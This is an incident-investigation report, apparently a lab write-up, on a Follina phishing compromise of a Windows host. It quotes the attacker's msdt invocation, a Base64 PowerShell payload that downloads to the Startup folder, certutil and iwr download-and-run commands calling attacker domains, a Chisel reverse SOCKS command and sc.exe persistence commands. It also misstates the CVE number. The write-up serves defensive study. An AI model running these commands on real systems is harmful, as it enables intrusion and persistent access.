# Tempest investigation

## Executive Summary
&nbsp;&nbsp;&nbsp; This report is an analysis of an escalated critical alert involving the user `benimaru` on the Windows host `TEMPEST`. Investigation into the event verifies the 
user opened a malicious Microsoft Word document named `free_magicules.doc`, which led to the exploitation of a high-severity remote code execution vulnerability CVE-2022-3091, also 
known as Follina. Post-execution activities included establishing initial persistence, connection to a command-and-control server, user and system enumeration, privilege escalation,
and creating additional accounts to maintain access. Each event is documented with corresponding evidence and is mapped to a MITRE ATT&CK technique and ID.

## Tools Used
<table>
<th>Tool</th>
<tr>
    <td>Base64decode.com</td>
 </tr>
<tr>	
    <td>Event Viewer</td>
 </tr>
<tr>
    <td>EvtxECmd</td>
 </tr>
<tr>
    <td>Sysmon Viewer</td>
 </tr>
<tr>
    <td>Timeline Explorer</td>
 </tr>
<tr>
    <td>Wireshark</td>
 </tr>
</table>

## Provided Artifacts
<table>
<th>File</th>
<th>Hash Type</th>
<th>Hash</th>
<tr>
    <td>capture.pcapng</td>
    <td>SHA256</td>
    <td>CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6</td>
<tr>
    <td>sysmon.evtx</td>
    <td>SHA256</td>
    <td>665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F</td>
</tr>
<tr> 
    <td>windows.evtx</td>
    <td>SHA256</td>
    <td>D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60</td>
</table>

## Timestamp Table

<table>
<th>Process</th>
<th>PID</th>
<th>Start time</th>
<th>Process Termination</th>
<th>Notes</th>

<tr>
   <td>chrome.exe</td>
   <td>8132</td>
   <td>17:12:58</td>
   <td>N/A</td>
   <td>free_magicules.doc was downloaded via chrome.exe</td>
</tr>
<tr>
   <td>WINWORD.EXE</td> 
   <td>496</td>
   <td>17:13:35</td>
   <td>N/A</td>
   <td>free_magicules.doc is opened triggering initial payload download</td>
</tr>
<tr>
  <td>certutil.exe</td>
   <td>7484</td>
   <td>17:15:14</td>
   <td>N/A</td>
   <td>certutil.exe downloads first.exe</td>
</tr>
<tr>
   <td>first.exe</td>
   <td>8948</td>
   <td>17:15:14</td>
   <td>17:28:28</td>
   <td>first.exe is executed initiating C2 connection</td>
</tr>
<tr>
   <td>ch.exe</td>
   <td>7388</td>
   <td>17:18:48</td>
   <td>17:28:28</td>
   <td>ch.exe launches SOCKS proxy</td>
</tr>
<tr>
   <td>spf.exe</td>
   <td>6828</td>
   <td>17:20:10 (downloaded)</td>
   <td>17:21:34</td>
   <td>File associated with PrintSpoofer execution</td>
</tr>
<tr>
   <td>final.exe</td>
   <td>8264</td>
   <td>17:21:34</td>
   <td>N/A</td>
   <td>Used to create new users for maintaining persistence</td>
</tr>
</table>

## Initial access:

MITRE ID: T1566 – Phishing 

Domain IP: 167[.]71[.]199[.]191

&nbsp;&nbsp;&nbsp; Investigation indicates the user `TEMPEST/benimaru` downloaded a malicious file `free_magicules.doc` from URL `hxxp://phishteam[.]xyz/02dcf07/free_magicules[.]doc` using 
`chrome.exe`. 

## Execution 

MITRE ID: T1204.002 – User Execution: Malicious File

&nbsp;&nbsp;&nbsp; The user opened `free_magicules.doc` which triggered a `ms-msdt` to invoke PowerShell code containing a Base-64 encoded payload being downloaded via
`hxxp://phishteam[.]xyz/02dcf07/update[.]zip`.

PowerShell code: 

```
C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$
(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String

```

Encoded Payload: 

```
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
```

Decoded Payload: 

```
$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
```

## Initial Persistence

MITRE ID: T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

&nbsp;&nbsp;&nbsp; Persistence was achieved by extracting `update.zip` into the Startup folder:

`C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`.

This allowed for `first.exe` to be executed as soon as the user logged into the host.

## C2 Execution

### Initial C2 Connection

MITRE ID: T1071.001 – Application Layer Protocols: Web Protocols

Domain IP: 167[.]71[.]222[.]162

&nbsp;&nbsp;&nbsp;A hidden, non-interactive PowerShell command utilized `certutil.exe` to download a secondary payload `first.exe` from `hxxp://phishteam[.]xyz/02dcf07/first[.]exe`. `first.exe` 
was then immediately executed, which initiated a connection to the command-and-control server `hxxp://resolvecyber[.]xyz/9ab62b5`. The connection was verified correlating network 
traffic events with Sysmon log events.  

#### PowerShell Command:

 ```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe

```

&nbsp;&nbsp;&nbsp; The execution of `first.exe` resulted in a new connection to a command-and-control server located at `hxxp://resolvecyber[.]xyz/9ab62b5`.

### Chisel SOCKS Tunnel 

MITRE ID: T1572 – Protocol Tunneling

&nbsp;&nbsp;&nbsp;Following the initial C2 connection byestablished  `first.exe`, the malware downloaded `ch.exe` from `phishteam[.]xyz`, via  PowerShell Invoke-WebRequest. The file established a Chisel SOCKS proxy, 
which allowed the attacker to forward traffic through an intermediary host (`phishteam[.]xyz`) and obscure communications originating from the primary C2 server (`resolvecyber[.]xyz`). 
Additional analysis identified the use of wsmprovhost.exe, indicating PowerShell and WinRM post-exploitation command execution.

#### PowerShell Command: 

```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe
```

#### SOCKS Connection: 

```
"C:\Users\benimaru\Downloads\ch.exe" client 167.71.199.191:8080 R:socks
```

## Discovery

MITRE IDs:
 
   -	T1033 – System Owner/User Discovery
   -	T1083 – File and Directory Discovery
   -	T1046 – Network Service Discovery
   -	T1069.001 – Permission Groups Discovery: Local Groups

&nbsp;&nbsp;&nbsp;The attacker leveraged C2 communications using HTTP GET requests to `resolvecyber[.]xyz/9ab62b5` to retrieve encoded commands used for discovery and enumeration 
activities. Analysis of the network traffic indicated the attacker was able to enumerate open ports, user and group associations, and the discovery of a password inside of a PowerShell 
script file (`automation.ps1`).  Analysis also indicates the attacker was able to identify the user `benimaru` had `SeImpersonatePrivilege` enabled, a privilege which can be abused to 
escalate the user’s privileges to SYSTEM-level access.

## Privilege Escalation

MITRE ID: T1068 – Exploitation for Privilege Escalation

&nbsp;&nbsp;&nbsp; The attacker downloaded a file named `spf.exe`, which is associated with the tool PrintSpoofer. PrintSpoofer is used to escalate privileges in Windows environments by exploiting a
vulnerability in the Print Spooler service. It abuses `SeImpersonatePrivilege`, which allows for a low-privileged user to gain SYSTEM-level privileges. 

## Long Term Persistence

MITRE ID: 
  
   -	T1053.005 – Scheduled Task
   -	T1098 – Account Manipulation
   -	T1136.001 – Create Account: Local Account

&nbsp;&nbsp;&nbsp;Following the execution of `final.exe`, the attacker established multiple persistence mechanisms to ensure long-term access to the host. Two scheduled tasks were created
(`TempestUpdate` and `TempestUpdate2`) both of which were configured to execute `C:\ProgramData\final.exe` at startup.Additionally, the attacker created two new user accounts
(`shuna` and `shion`). Shion was added to `localgroup administrators`, this behavior combined with the attacker changing the administrator account password is indicative of an attempt 
to maintain privileged access to the host.  The combination of these events indicates the attacker took multiple steps to maintain persistence on the host machine. 

#### Scheduled Tasks:

```
"C:\Windows\system32\sc.exe" \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto
```

```
"C:\Windows\system32\sc.exe" \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
```

## Malicious Artifact Hash Table

<table>
<th>File<th>
<th>Hash</th>
<tr>
   <td>free_magicules.doc</td>
   <td>E25F32401FD3D25958B8B99F280F0325B232E54F185CC5D6E0710923005AC64A </td>
</tr>
<tr>
   <td>first.exe</td>
   <td>CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8</td>
</tr>
<tr>
   <td>ch.exe</td>
   <td>8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451</td>
</tr>
<tr>
   <td>spf.exe</td>
   <td>8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D</td>
</tr>
<tr>
   <td>final.exe</td>
   <td>03E1840A24506AFC88AB5FF7F83D2B07B558B34FF42DD34DD93267FD2E7A74E6</td>
</tr>
</table>

## Remediation 
&nbsp;&nbsp;&nbsp; The host should be immediately isolated from the network to prevent further command and control communications and potential lateral movement. 
The initial phishing vector `free_magicules.doc` should be added to email blocklists and blocklisted on all endpoint security mechanisms. 

The following malicious domains and IP addresses need to be blocked at DNS and firewall levels.
  
   -	Domain: `phishteam[.]xyz` IP: `167[.]71[.]199[.]191`
   -	Domain: `resolvecyber.xyz` IP: `167[.]71[.]222[.]162`

&nbsp;&nbsp;&nbsp; Any payload files ( `update.zip`, `first.exe`, ` ch.ex`, `spf.exe`, `final.exe`) and their associated hashes need to be added to blocklists on all endpoint 
security mechanisms. Additionally, all persistence mechanisms including scheduled tasks, start up folder entries, and unauthorized accounts created during the attack need to 
be removed from the host, and any account associated with a password change needs to be reset. 
&nbsp;&nbsp;&nbsp; Given the severity of the attack and the privileges gained by the attacker a full forensics analysis should be conducted to ensure no residual access, 
files or accounts remain. 

## Conclusion

&nbsp;&nbsp;&nbsp; The investigation confirmed a multi-stage attack initiated by a phishing attachment `free_magicules.doc` opened by the user `benimaru`. This activity led to an 
initial connection to the phishing site `phishteam[.]xyz`. The initial payload was stored in the user’s startup folder which led to the execution of `first.exe` resulting in a connection 
to the C2 server `resolvecyber.xyz`. 
&nbsp;&nbsp;&nbsp;Following this event, the attacker was able to establish a successful SOCKS proxy using Chisel which was executed via `ch.exe`, enabling the attacker to mask the
C2 servers’ identity by rerouting the traffic through`phishteam[.]xyz`.  Further analysis indicates the attacker was able to gain SYSTEM-level access and establish and maintain long-term 
persistence via schedule tasks and new account creation, including membership in the local Administrators group.  This activity demonstrates a full attack lifecycle consisting of initial 
access, C2 establishment, privilege escalation, and persistence mechanisms. 
